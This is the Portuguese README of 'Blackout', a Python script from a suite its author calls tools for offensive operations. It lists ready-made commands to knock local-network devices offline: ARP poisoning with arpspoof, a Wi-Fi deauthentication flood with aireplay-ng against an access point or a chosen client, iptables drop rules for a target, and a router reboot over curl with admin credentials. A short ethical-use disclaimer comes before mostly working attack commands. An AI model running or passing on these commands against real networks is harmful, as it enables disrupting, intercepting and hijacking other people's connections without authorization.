


🛑 BLACKOUT

Um script Python para travar ou isolar dispositivos conectados à rede local.
Parte do projeto ZeroKey - uso restrito a ambientes controlados e autorizados.

⚙️ Sobre

Blackout é um script que executa comandos de bloqueio contra dispositivos conectados à mesma rede. É voltado para profissionais de segurança cibernética, testes de intrusão em ambientes autorizados e automação de controle de rede.

🚨 Aviso de Uso Ético

⚠️ Atenção: Este script é uma ferramenta poderosa e não deve ser utilizada em redes que você não tem permissão para monitorar ou controlar.

O uso indevido pode ser considerado crime cibernético (Lei nº 12.737/2012 - Brasil).

Utilize apenas para fins educacionais, profissionais ou testes com autorização.

📦 Requisitos

Python 3.x

Biblioteca colorama

pip install colorama

Ferramentas externas:

arpspoof (pacote dsniff)

iptables

aireplay-ng (pacote aircrack-ng)

curl

🎛️ Modo Interativo com Menu

O script agora possui um menu com as seguintes opções:

ARP Spoof – interceptação ou envenenamento ARP

Bloqueio por IP – usando iptables

Bloqueio por MAC – usando iptables

Deauth Wi-Fi – ataque de desconexão com aireplay-ng

Reiniciar Roteador – via curl (HTTP básico)

Sair

🧪 Execução

python Blackout.py

Você será guiado por um menu com perguntas e comandos automáticos.

🧠 Exemplos Reais de Comandos

ARP Spoof (envenenamento):

arpspoof -i wlan0 -t 192.168.0.105 192.168.0.1

Bloquear por IP:

iptables -A INPUT -s 192.168.0.105 -j DROP
iptables -A FORWARD -s 192.168.0.105 -j DROP

Bloquear por MAC:

iptables -A INPUT -m mac --mac-source AA:BB:CC:DD:EE:FF -j DROP

Deauth Wi-Fi:

aireplay-ng --deauth 1000 -a [BSSID] wlan0mon
# ou para um alvo específico:
aireplay-ng --deauth 1000 -a [BSSID] -c [MAC_CLIENTE] wlan0mon

Reiniciar roteador:

curl -u admin:senha http://192.168.0.1/reboot.cgi

🖼️ Capa Visual

O projeto acompanha um logotipo com estética cyberpunk/hacker:

Arquivo: BLACKOUT_LOGO.pngUso: Pode ser exibido em painéis, GUIs ou como splash de apresentação.

🔐 Projeto ZeroKey

Este script é um módulo interno do projeto ZeroKey, uma suíte de ferramentas para cibersegurança, automação de recon e operações ofensivas.

📄 Licença

Uso restrito. Distribuição permitida apenas com autorização do autor.

✉️ Contato

Autor: LUAN CARLOS Email: limacharlly@gmail.com Projeto: ZeroKey

